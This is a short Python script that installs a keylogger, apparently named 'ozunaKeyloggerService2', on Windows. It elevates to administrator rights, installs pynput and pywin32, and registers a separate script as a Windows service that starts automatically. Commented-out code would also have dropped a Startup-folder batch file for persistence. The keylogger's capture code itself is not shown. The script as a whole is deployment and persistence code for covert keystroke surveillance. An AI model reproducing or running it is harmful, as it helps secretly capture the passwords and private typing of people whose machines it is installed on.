
import os
import shutil
import subprocess
from distutils.dir_util import copy_tree
from elevate import elevate

print("Service Started")
serviceName = "ozunaKeyloggerService2"
#appdatapth = os.getenv('APPDATA')
#applicationDir = os.path.join(appdatapth, 'ozuna-keylogger')
#startupDirectory = os.path.join(appdatapth, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
#startupBatfilePath = os.path.join(startupDirectory, 'logger.bat')

#print('Directory')
#print(startupDirectory)
elevate()
#if not os.path.isdir(applicationDir):
#    os.makedirs(applicationDir)
curPath = os.path.dirname(os.path.realpath(__file__))
destScripLocation = os.path.join(curPath, 'SMWinservice.py')
#copy_tree(os.path.dirname(os.path.realpath(__file__)), applicationDir)

# batScriptContent = """@ECHO OFF
# net start {0}
# EXIT /B
# """.format(serviceName)

#if not os.path.isfile(startupBatfilePath):
#f = open(startupBatfilePath, 'w')
#f.write(batScriptContent)
#f.close()
os.system('cmd /k "pip install pywin32 && pip install pynput && python \"{0}\" install && sc config {1} start=auto && python \"{0}\" --startup=auto start"'.format(destScripLocation, serviceName))
